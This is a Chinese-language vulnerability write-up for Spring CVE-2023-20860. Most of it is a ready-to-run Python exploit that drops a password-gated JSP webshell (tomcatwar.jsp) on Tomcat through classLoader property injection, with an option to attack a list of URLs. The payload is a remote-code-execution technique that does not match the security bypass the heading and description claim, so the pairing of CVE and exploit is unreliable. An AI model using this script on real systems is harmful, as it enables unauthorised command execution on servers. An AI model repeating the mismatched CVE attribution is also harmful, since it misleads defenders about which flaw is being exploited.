# Spring Framework 安全绕过漏洞 CVE-2023-20860

## 漏洞描述

在带有 mvcRequestMatcher 的 Spring Security 配置中使用无前缀双通配符模式会导致 Spring Security 和 Spring MVC 之间的模式匹配不匹配，并可能导致安全绕过。

## 漏洞影响

```
6.0.0 - 6.0.6、5.3.0 - 5.3.25（注：5.3 之前的版本不受影响）
```

## 漏洞复现

exp

```
#!/usr/bin/env python3
#coding:utf-8

import requests
import argparse
from urllib.parse import urljoin

def Exploit(url):
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:

        go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        shellurl = urljoin(url, 'tomcatwar.jsp')
        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")
    except Exception as e:
        print(e)
        pass

def main():
    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
    parser.add_argument('--file',help='url file',required=False)
    parser.add_argument('--url',help='target url',required=False)
    args = parser.parse_args()
    if args.url:
        Exploit(args.url)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)

if __name__ == '__main__':
    main()
```

## 漏洞修复

受影响用户及时更新升级到以下修复版本：

- Spring Framework >= 6.0.7
- Spring Framework >= 5.3.26

下载链接：https://spring.io/projects/spring-framework
